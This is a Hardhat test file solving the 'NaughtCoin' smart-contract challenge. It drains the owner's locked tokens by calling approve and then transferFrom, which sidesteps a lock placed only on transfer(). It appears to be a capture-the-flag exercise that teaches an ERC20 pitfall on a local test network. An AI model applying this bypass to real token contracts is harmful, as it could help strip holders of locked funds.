const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");
const { mine } = require("@nomicfoundation/hardhat-network-helpers");

const NAME = "NaughtCoin";

describe.only(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy(owner.address);

        return { owner, victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let owner, victimContract, attackerWallet, attackerContract;
        before(async function () {
            ({ owner, victimContract, attackerWallet } = await loadFixture(setup));
        })

        // ERC20 = be aware of transferFrom and approve mechanics when overriding transfer logic.
        it("conduct your attack here", async function () {
            await victimContract.connect(owner).approve(attackerWallet.address, ethers.utils.parseEther("1000000"));
            await victimContract.connect(attackerWallet).transferFrom(owner.address, attackerWallet.address,
                                                                    ethers.utils.parseEther("1000000"));
        });

        after(async function () {
            expect(await victimContract.balanceOf(owner.address)).to.be.equal(0);
        });
    });
});